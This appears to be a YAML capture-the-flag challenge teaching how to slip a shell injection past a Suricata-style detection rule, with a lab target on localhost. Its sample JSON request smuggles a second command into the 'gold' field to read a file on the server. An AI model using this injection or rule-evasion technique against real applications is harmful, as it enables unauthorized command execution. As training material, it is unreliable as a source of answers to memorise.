name: 'Shell Injection (JSON) 1'
type: 'exploit'

text: |-
  Time to bypass the rule(s) below! You're on your own now, but feel free to
  ask questions!

  **Goal: Print /app/valuate-hoard**

hints: []

target:
  dev:
    host: localhost
    port: 10007
  prod:
    host: detector
    port: 80

base_request: |-
  POST /backend.php HTTP/1.1
  Host: localhost
  Content-Type: application/json
  Content-Length: 98

  {
    "hoardType": "artifact",
    "gold": "10';cat /app/valuate-hoard; echo '",
    "gems": "20",
    "artifacts": "30"
  }

rules:

# Avoid 'json'
- >
  alert http any any -> any any (msg:"Gotcha!"; flow:to_server,established; http.request_body; content: "\"artifact\""; content: "\;"; sid:123456; rev:1;)

expected_output: "Perform some math"
